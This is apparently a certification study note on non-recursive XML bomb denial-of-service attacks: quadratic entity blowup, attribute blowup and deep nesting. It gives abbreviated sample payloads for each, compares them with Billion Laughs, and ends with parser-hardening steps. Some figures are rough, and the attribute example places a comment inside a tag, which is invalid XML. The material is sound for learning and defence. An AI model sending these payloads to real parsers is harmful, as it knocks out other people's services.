2026-02-04 17:55

Status:

Tags: [[eWPTX]] [[XML]]
###### Prerequisites: [[XML Injection - Attack Types]]
# XML Bombs

## Overview

XML bombs are denial-of-service payloads that overload parsers through large or deeply nested XML structures. Unlike [[Billion Laughs Attack]], XML bombs are **non-recursive** -- they do not rely on entity expansion chains. Instead, they use brute-force size or repetition.

## Quadratic Blowup Attack

Define one large entity, then reference it thousands of times. No recursion, but massive output.

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">  <!-- 40 chars -->
]>
<bomb>
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  <!-- repeat entity reference ~50,000 times -->
</bomb>
```

**Math**: A 40-byte entity repeated 50,000 times = ~2 MB of expanded text from a ~500 KB input. The growth is quadratic (O(n^2)) rather than exponential.

This bypasses Billion Laughs protections that only check for recursive/nested expansion but not repetition count.

## Attribute Blowup

Overload the parser with thousands of attributes on a single element:

```xml
<element
  a1="val" a2="val" a3="val" a4="val" a5="val"
  a6="val" a7="val" a8="val" a9="val" a10="val"
  <!-- ... thousands more attributes ... -->
  a9999="val" a10000="val"
/>
```

This forces the parser to allocate hash table entries for every attribute. Some parsers use O(n^2) lookup for duplicate attribute checking, causing CPU exhaustion.

## Deep Nesting Bomb

Deeply nested elements without entity expansion:

```xml
<a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a><a>
<!-- 10,000+ levels deep -->
</a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a>
```

Causes stack overflow in recursive descent parsers. Effective against parsers without depth limits.

## Resource Consumption Summary

| Attack Type       | Input Size | Memory Impact | CPU Impact | Bypasses Recursion Limits |
|-------------------|-----------|---------------|------------|---------------------------|
| Quadratic blowup  | ~500 KB   | ~2 MB+        | Moderate   | Yes                       |
| Attribute blowup  | ~200 KB   | Moderate      | High       | Yes                       |
| Deep nesting      | ~100 KB   | Stack-based   | High       | Yes                       |
| Billion Laughs    | ~1 KB     | ~3 GB         | High       | No                        |

## Billion Laughs vs XML Bombs

- **Billion Laughs**: exponential, recursive entity references, tiny input, massive expansion
- **XML Bombs**: linear/quadratic, no recursion, larger input, still effective DoS
- XML bombs are useful when the parser has entity expansion limits but no size/depth limits

## Parser Hardening

1. **Set maximum document size** -- reject XML over a threshold (e.g., 1 MB)
2. **Set maximum element depth** -- limit nesting to 100-200 levels
3. **Set maximum attribute count per element** -- cap at 100-200
4. **Set entity expansion limits** -- covers both bombs and Billion Laughs
5. **Set parsing timeouts** -- kill parsing after a reasonable time limit
6. **Use streaming parsers (SAX/StAX)** -- process elements one at a time instead of loading the full DOM
